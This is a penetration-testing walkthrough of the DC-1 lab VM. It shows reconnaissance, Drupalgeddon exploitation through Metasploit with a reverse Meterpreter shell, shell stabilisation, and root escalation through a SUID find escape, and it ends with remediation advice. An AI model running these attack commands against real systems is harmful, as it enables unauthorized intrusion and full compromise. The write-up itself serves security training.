# Laboratory Manual: The DC-1 Machine

This manual is a penetration testing walkthrough of the vulnerable virtual machine **DC-1**. The principal objective of this laboratory exercise is to guide the researcher or security auditor through a realistic vulnerability assessment lifecycle, adhering closely to internationally recognized best practices.

Through the study of the DC-1 machine, several critical concepts of information systems security are examined in depth: the identification of attack surfaces on the local network; the analysis and exploitation of well-known architectural flaws in Content Management Systems (CMS); shell stabilization and post-exploitation of Linux infrastructure; and the exploitation of misconfigured access permissions in the Unix file system to achieve Local Privilege Escalation.

> * **Download:** [VulnHub — DC: 1](https://www.vulnhub.com/entry/dc-1,292/)
> * **Writeup in English:** [Hacking Articles — DC-1: Vulnhub Walkthrough](https://www.hackingarticles.in/dc-1-vulnhub-walkthrough/)
> - **YouTube Video:** [Vulnhub - DC-1 Series Walkthrough with S1REN](https://www.youtube.com/watch?v=PzPTXDIbw6c)

The overall procedure is structured into the following four methodological phases:
1. **Reconnaissance & Service Fingerprinting**
2. **Vulnerability Assessment & Weaponized Exploitation**
3. **Post-Exploitation & Data Harvesting**
4. **Privilege Escalation to Root**

---

## 2. Phase 1: Reconnaissance & Discovery

### 2.1 Test Environment Configuration & Network Architecture

To ensure that the test is carried out safely and reliably, both the attacker's workstation (Kali Linux) and the vulnerable target machine (DC-1) are placed within a controlled, isolated virtual network (Host-Only mode or a shared NAT Network configured through the VirtualBox / VMware Workstation hypervisor). This architecture guarantees that the training attack cannot leak into production corporate or home networks, while also providing seamless, bidirectional connectivity at OSI Layer 2 (Data Link) and Layer 3 (Network).

In a typical "Black-Box" penetration testing scenario, the tester does not know the target's static or dynamic IPv4 address in advance, since it is assigned automatically by the built-in DHCP service of the virtual environment. Consequently, the first necessary step is to locate the target machine using passive or active scanning techniques on the local network.

### 2.2 Discovering Live Hosts via the ARP Protocol

The detection of live hosts on the local subnet relies primarily on sending ARP (*Address Resolution Protocol*) requests. Unlike traditional ICMP Echo Request sweeps (commonly known as "ping"), which are frequently filtered or silently dropped by host-based firewalls (iptables, nftables, etc.), ARP packets are mandatory for communication at the Ethernet layer. By design of the protocol, every live host within the same broadcast domain is required to respond with its MAC address, which makes its detection effectively infallible.

```bash
sudo netdiscover -r 192.168.35.0/24
```
* `sudo`: Runs the tool with elevated superuser (`root`) privileges, which are strictly required because direct access to the network interface (raw socket access) is needed to craft and send raw ARP packets.
* `netdiscover`: A specialized address discovery tool for local Ethernet networks, capable of operating both in passive listening mode and in active mode, sending ARP queries in bulk.
* `-r 192.168.35.0/24`: Specifies the IPv4 subnet range to be examined in CIDR (*Classless Inter-Domain Routing*) notation. The program sends ARP requests, sequentially or in parallel, to all 254 possible addresses in the range (`192.168.35.1` through `192.168.35.254`), collecting and sorting the replies in real time.

![Discovering Live Hosts on the Local Subnet with Netdiscover](../../05.%20DC-CTF/images/image.png)

*Figure 1 — Discovering Live Hosts on the Local Subnet with Netdiscover*

### 2.3 Full Port Scan and Deep Service Fingerprinting

Once the target's IP address (`192.168.35.131`) has been confirmed, a detailed mapping of the open TCP ports and the extraction of the banners of the running services are required. A superficial scan of only the 1,000 most common ports (the default Nmap scan) risks overlooking critical services running on unusual or high-numbered ports. For this reason, an exhaustive scan of the entire range of 65,535 ports is performed.

```bash
nmap -sV -p- 192.168.35.131
```

![Detailed Nmap Service Scan Output](../../05.%20DC-CTF/images/image-1.png)
*Figure 2 — Detailed Nmap Service Scan Output*

* `nmap`: Network Mapper, the internationally recognized tool for network auditing, topology mapping, and vulnerability analysis.
* `-sV` (*Service Version Detection*): Enables version detection. Nmap completes the TCP handshake on open ports, sends specialized data sequences (probes) from the `nmap-service-probes` database, and analyzes the responses to identify precisely the name and version of each application.
* `-p-`: Shorthand for `-p 1-65535`. Forces every one of the 65,535 available TCP ports to be checked, eliminating the possibility of services being hidden on non-standard ports.
* `192.168.35.131`: The IPv4 address of the target system obtained in the previous step.

### 2.4 Web Application Inspection & Preliminary Vulnerability Assessment

Analysis of port 80 reveals an Apache server running on the Debian Wheezy (7.x) operating system, which indicates a significantly outdated system. Browsing to `http://192.168.35.131/` displays the home page of the popular Content Management System **Drupal**.

Inspection of the page source, the meta tags, and files such as `/CHANGELOG.txt` reveals that the installed version is **Drupal 7.x**. Historically, the Drupal 7.x branch exhibited fundamental architectural security flaws in input parameter handling and database query execution, the most notorious example being the Drupalgeddon vulnerability (CVE-2014-3704), which allows unauthenticated remote users to execute arbitrary code (Remote Code Execution - RCE).

---

## 3. Phase 2: Vulnerability Assessment & Initial Compromise (Exploitation)

### 3.1 Launching and Preparing the Metasploit Framework

To systematize and carry out the attack, the **Metasploit Framework**, the most widely used penetration testing platform, is employed. Metasploit provides a comprehensive infrastructure for managing exploits, payloads, encoders, and auxiliary tools, enabling the automated verification of security flaws in a consistent and predictable manner.

```bash
msfconsole
```

* `msfconsole`: Launches Metasploit's interactive Command-Line Interface. On startup, the environment initializes its connections to the underlying PostgreSQL database, loads thousands of catalogued vulnerability modules into RAM, and provides a flexible shell for managing attacks.

![Launching the msfconsole Interface](../../05.%20DC-CTF/images/image-2.png)
*Figure 3 — Launching the msfconsole Interface*

### 3.2 Searching for Specialized Modules for the Drupal CMS

With the Metasploit environment ready for use, the built-in indexed database is queried in order to identify all available exploitation modules targeting the Drupal platform.

```bash
msf6 > search drupal
```

* `search drupal`: Recursively searches the `exploits/`, `auxiliary/`, and `post/` libraries for any module containing the term "drupal" in its title, description, or metadata. The result is a table showing the module name, the vulnerability disclosure date, the reliability rating (Ranking), and a short description of the attack mechanism.

![Drupal Module Search Results Table](../../05.%20DC-CTF/images/image-3.png)

*Figure 4 — Drupal Module Search Results Table*

### 3.3 Module Selection, Configuration & Execution of the Attack

From the results, the module `exploit/multi/http/drupal_drupageddon` is selected. This vulnerability (**CVE-2014-3704**) resides in the Database Abstraction API of Drupal 7.x, which did not adequately sanitize the array parameters passed into prepared SQL statements.

![`use exploit/multi/http/drupal_drupageddon`: automatic selection of the `php/meterpreter/reverse_tcp` payload.](../../05.%20DC-CTF/images/image-4.png)

*Figure 5 — `use exploit/multi/http/drupal_drupageddon`: automatic selection of the `php/meterpreter/reverse_tcp` payload.*

This allows an unauthenticated remote attacker to perform SQL Injection, through which they can modify administrative tables, insert malicious PHP code into the database, or achieve direct arbitrary code execution on the operating system (Remote Code Execution - RCE).

```bash
msf6 > use exploit/multi/http/drupal_drupageddon
msf6 exploit(multi/http/drupal_drupageddon) > set RHOSTS 192.168.35.131
msf6 exploit(multi/http/drupal_drupageddon) > exploit
```

* `use exploit/multi/http/drupal_drupageddon`: Loads the specified exploit module into the active workspace and automatically configures the default compatible payload, typically `php/meterpreter/reverse_tcp`.
 * `set RHOSTS 192.168.35.131`: Sets the `RHOSTS` (*Remote Hosts*) option, specifying the IPv4 address of the vulnerable target server.
 * `exploit` (or alternatively `run`): Launches the attack. Metasploit sets up a local listener (handler) on the Kali machine, crafts the malicious HTTP POST requests containing the SQL Injection payload and the PHP reverse shell, and sends them to the target. As soon as the code is executed by the Apache server, the target connects back to Kali Linux, opening an active Meterpreter session.

![Setting the target with `set RHOSTS 192.168.35.131`.](../../05.%20DC-CTF/images/image-5.png)

*Figure 6 — Setting the target with `set RHOSTS 192.168.35.131`.*

![Successful Exploitation and Opening of a Meterpreter Session](../../05.%20DC-CTF/images/image-7.png)

*Figure 7 — Successful Exploitation and Opening of a Meterpreter Session*

---

## 4. Phase 3: Post-Exploitation & Evidence Gathering

### 4.1 Dropping into a System Shell and Upgrading to a PTY

The Meterpreter session provides powerful capabilities for memory management, file transfer, and process execution; however, thorough exploration of a Linux operating system requires direct access to the native Unix command shell.

```bash
meterpreter > shell
```



* `shell`: Creates a new communication sub-channel within the Meterpreter session and starts a process of the basic command shell (`/bin/sh`) on the target.


![Launching a Basic Shell via Meterpreter](../../05.%20DC-CTF/images/image-8.png)
*Figure 8 — Launching a Basic Shell via Meterpreter*

The initial shell obtained is a "dumb shell." It lacks TTY support, command auto-completion (tab completion), command history via the arrow keys, and proper handling of termination signals (for example, pressing `Ctrl+C` will terminate the entire session rather than the current process). To overcome this limitation, the shell is upgraded to a full Pseudo-Terminal (PTY) using the Python interpreter.

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

* `python`: Invokes the Python interpreter installed on the target system.
* `-c`: Allows Python code passed as a string argument on the command line to be executed directly, avoiding the need to write a temporary script file to disk.
* `'import pty; pty.spawn("/bin/bash")'`: Imports Python's built-in `pty` library (which handles pseudo-terminal operations on Unix operating systems) and calls the `spawn()` method. This method starts a new `/bin/bash` process attached to a newly created virtual PTY, providing a fully functional, interactive shell with a recognizable user prompt.
                    |

### 4.2 Locating and Interpreting Flag 1

Now located in the web server's working directory (`/var/www`), a detailed listing of the files is performed in order to find the initial hints left by the author of the lab.

```bash
ls -la
cat flag1.txt
```

 * `ls -la`: 
* `ls`: Lists the contents of the current directory.
* `-l` (*long listing*): Displays detailed information for each file (rwx access permissions, number of links, owner, group, size in bytes, and last-modification timestamp).
* `-a` (*all*): Shows all files, including hidden ones (those whose names begin with a dot `.`, such as `.htaccess` and `.bashrc`).
 * `cat flag1.txt`: Concatenates and prints the contents of the text file `flag1.txt` to standard output (stdout).

![Reading the flag1.txt File](../../05.%20DC-CTF/images/image-10.png)
*Figure 9 — Reading the flag1.txt File*

The content of Flag 1 indicates that the CMS configuration files contain critical data. In Drupal 7, the core configuration file is `sites/default/settings.php`, which includes, among other things, the credentials for connecting to the MySQL database.

---

## 5. Phase 4: Local Privilege Escalation

### 5.1 Attack Surface Analysis & Detection of SUID Executables

The current session runs under the privileges of the `www-data` account (the standard unprivileged user employed by the Apache service). Full compromise of the target requires obtaining the privileges of the superuser `root` (UID 0).

One of the most critical local privilege escalation mechanisms in Unix/Linux environments is the abuse of executables that have the special **SUID** (*Set User ID*) permission enabled. When a binary has the SUID bit set, it always runs with the privileges of the file's owner rather than those of the user who invoked it. If a `root`-owned executable carries the SUID bit and also permits the execution of external commands or a shell escape, it can be leveraged for immediate privilege escalation.

```bash
find / -perm -u=s -type f 2>/dev/null
```

* `find /`: Starts an exhaustive, recursive search beginning at the root of the file system (`/`).
* `-perm -u=s`: Filters the results to include only files whose permissions contain the SUID bit for their owning user (equivalent to the octal pattern `-4000`).
* `-type f`: Restricts the search exclusively to regular files, discarding directories, symbolic links, and special device files.
* `2>/dev/null`: Redirects the standard error stream (Standard Error - file descriptor 2) to the kernel's special null device `/dev/null`. This suppresses the hundreds of "Permission denied" messages that would otherwise be produced as the unprivileged user `www-data` attempts to read protected system directories, keeping the output clean and readable.

![SUID Binary Scan Results](../../05.%20DC-CTF/images/image-11.png)

*Figure 10 — SUID Binary Scan Results*


### 5.2 Exploitation Mechanism of the SUID Permission on `find`

The presence of the SUID bit on the `/usr/bin/find` executable constitutes a severe Security Misconfiguration. The `find` utility includes the `-exec` action, which allows the user to specify an arbitrary system command to be executed automatically for every object that matches the search criteria.

Because the `find` binary is owned by `root` and carries the SUID bit, every child process spawned through the `-exec` option automatically inherits `root`'s Effective User ID (EUID). By directly invoking a system shell (such as `/bin/sh`), a shell with full superuser privileges is obtained.

```bash
/usr/bin/find . -exec /bin/sh \; -quit
```

![Shell with `root` privileges obtained by abusing the SUID `find`.](../../05.%20DC-CTF/images/image-12.png)

*Figure 11 — Shell with `root` privileges obtained by abusing the SUID `find`.*

* `/usr/bin/find`: Invokes the executable by its absolute path, preventing possible interference from environment variables such as `$PATH`.
* `.`: Sets the current directory as the search scope.
* `-exec /bin/sh \;`: Specifies the command to be executed.
  * `/bin/sh` starts a new shell session.
  * The `;` symbol marks the end of the `-exec` argument, while the backslash `\` (escape character) is required so that the `;` character is interpreted by `find` itself rather than prematurely by the parent bash shell.
 * `-quit`: Instructs `find` to terminate immediately after the first successful execution. Without the `-quit` option, `find` would attempt to execute `/bin/sh` repeatedly for every file in the directory, spawning multiple unnecessary sub-shells.

![Successful Privilege Escalation to Root](../../05.%20DC-CTF/images/image-13.png)

*Figure 12 — Successful Privilege Escalation to Root*

### 5.3 Identity Verification & Retrieval of the Final Flag

Having now obtained superuser (`root`) privileges, administrative control over the system is confirmed and the final reward file (flag) is retrieved, marking the full completion of the penetration test.

```bash
whoami
cd /root
ls -la
cat thefinalflag.txt
```

* `whoami`: Returns the effective username of the current session. The response `root` confirms operation at the highest privilege level of the operating system.
* `cd /root`: Changes the current working directory to the protected home directory of the system administrator, which is strictly off-limits to ordinary users.
* `ls -la`: Lists in detail all contents of the `/root` directory, revealing the presence of the file `thefinalflag.txt`.
* `cat thefinalflag.txt`: Reads and prints the lab's final completion message to the screen.

![Reading the Final thefinalflag.txt File](../../05.%20DC-CTF/images/image-14.png)
*Figure 13 — Reading the Final thefinalflag.txt File*

## 6. Technical Summary, Risk Assessment & Remediation Measures

The successful compromise of the DC-1 machine demonstrated a chain of two core security weaknesses which, in combination, led from a complete absence of credentials (Zero Access) to absolute control of the infrastructure (Root Compromise).

| Attack Stage | Identified Weakness | Severity Level (CVSS v3) | Technical Impact |
| :--- | :--- | :--- | :--- |
| **Initial Compromise** | Drupalgeddon (CVE-2014-3704) | **CRITICAL (9.8)** | Remote arbitrary code execution (RCE) via SQLi |
| **Privilege Escalation** | SUID Misconfiguration on `/usr/bin/find` | **HIGH (7.8)** | Bypass of restriction mechanisms and acquisition of root privileges |

### 6.1 Recommended Remediation Measures (Remediation & Hardening)

1. **Web Application Update Management (Patch Management):**
   * The Drupal installation must be upgraded immediately to the latest supported security release.
   * Install and properly configure a **Web Application Firewall (WAF)**, such as ModSecurity, with up-to-date rules (OWASP Core Rule Set) for the timely detection and rejection of malicious SQL Injection requests.

2. **Hardening File System Permissions (Principle of Least Privilege):**
   * The SUID bit must be removed immediately from the `find` executable, as well as from any other general-purpose utility that does not require special privileges to function properly:
     ```bash
     sudo chmod u-s /usr/bin/find
     ```
   * Implement regular automated integrity and permission checks (e.g., using AIDE, Tripwire, or periodic cron scripts) that scan the system for unauthorized changes to SUID/SGID files.
   * Enable and enforce strict Mandatory Access Control (MAC) policies through **AppArmor** or **SELinux**, preventing processes such as Apache (`www-data`) from executing system administration binaries or spawning PTY shells.
